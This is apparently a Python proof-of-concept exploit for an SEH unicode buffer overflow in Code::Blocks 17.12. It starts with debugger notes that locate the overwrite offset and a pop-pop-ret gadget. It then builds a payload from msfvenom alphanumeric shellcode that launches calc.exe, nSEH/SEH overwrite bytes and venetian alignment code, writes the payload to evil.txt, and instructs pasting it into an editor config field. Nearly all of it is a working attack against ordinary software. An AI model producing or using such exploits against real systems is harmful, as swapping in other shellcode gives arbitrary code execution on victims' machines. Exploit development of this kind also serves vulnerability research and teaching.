from struct import *

"""
1. overwrite SEH handler, observe vulnerability and unicode resictions
0:000:x86> !exchain
000000000028e6b4: codeblocks+10041 (0000000000410041)
Invalid exception stack at 0000000000410041

0:000:x86> d fs: [0]
0053:00000000  b4 e6 28 00 00 00 29 00-00 f0 25 00 00 00 00 00 ..(...)...%.....
0053:00000010  00 1e 00 00 00 00 00 00-00 d0 fd 7e 00 00 00 00 ...........~....
0053:00000020  f8 0e 00 00 74 10 00 00-00 00 00 00 60 a4 99 00 ....t.......`...
0053:00000030  00 e0 fd 7e 03 00 00 00-00 00 00 00 00 00 00 00 ...~............
0053:00000040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................

--> b4 e6 28 00 is the SEH handler, also confirming UNICODE restrictions

0:000:x86> d 0028e6b4
0028e6b4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e6c4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e6d4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e6e4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e6f4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e704  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e714  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0028e724  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.

2. calculate offset with cyclic unique pattern

 Log data, item 14
 Address=0BADF00D
 Message=    SEH record (nseh field) at 0x0028e6b4 overwritten with unicode pattern : 0x00430030 (offset 1982), followed by 3234 bytes of cyclic data after the handler
    
 Log data, item 16
 Address=005000E0
 Message=  0x005000e0 : pop edi # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READ} [codeblocks.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v17.12.0.0 (C:\Program Files (x86)\CodeBlocks\codeblocks.exe)

"""

# /msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_upper BufferRegister=EAX -v shellcode_calc EXITFUNC=seh
shellcode_calc  = "PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1"
shellcode_calc += "AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB9"
shellcode_calc += "44JBKLJH3RM0M0M01PE9JE01Y02DTKPPNPTKB2LL4KR2MDTKD2O8LOX70JMVNQKOFLO"
shellcode_calc += "L1QCLM2NLMPWQXOLMKQHGJBZRQBPWTK0RN0TKOZOL4K0LN1T8IS0HM1XQ21DKR9MPKQ"
shellcode_calc += "Z3TKOYLXISNZ194KOD4KM18VP1KOFLWQXOLMKQ97P8K0BUKFM3CMKHOK3MND45YT0XT"
shellcode_calc += "K1HO4KQXSC6TKLLPKTKQHMLM1J3TKLD4KM1XP3YQ4O4ND1KQK31PYPZB1KOYPQO1OPZ"
shellcode_calc += "4KN2JKDMQMQZM1DM3U7BKPM0KP0PS8P1TKBOE7KOZ57KKNLNNRIZ1XUV65WMEMKOJ5O"
shellcode_calc += "LM6SLLJE0KK9PCEKUWKOWMCSBRO2JKPR3KO9ERC1QRL1SNN1U3H35M0AA"

nseh = "\xe0\x50"
seh = "\x61\x62"

venterian_alignment = (
"\x53" 					#push ebx
"\x47" 					#align
"\x58" 					#pop eax
"\x47"
"\x47"          #align
"\x05\x28\x11" 	                        
"\x47"					#align
"\x2d\x13\x11"	#sub eax,300
"\x47"					#align
"\x50"					#push eax
"\x47"					#align
"\xc3"					#retn
)

payload  = "A" * 1982
payload += nseh
payload += seh
payload += "\x47" * 10
payload += venterian_alignment
payload += "\x47" * 16
payload += shellcode_calc
payload += "D" * 8000

try:
    print("[x] Exploit POC for Codeblocks 17.12 SEH unicode\n")
    file_payload = open("evil.txt", 'w')
    print("[x] Creating a .txt file for out payload")
    file_payload.write(payload)
    print("[x] Writing malicious payload to .txt file")
    file_payload.close()
    print("[x] Copy the file contents to editor location under config")
except:
    print("[!] Failed to create malicious .txt")
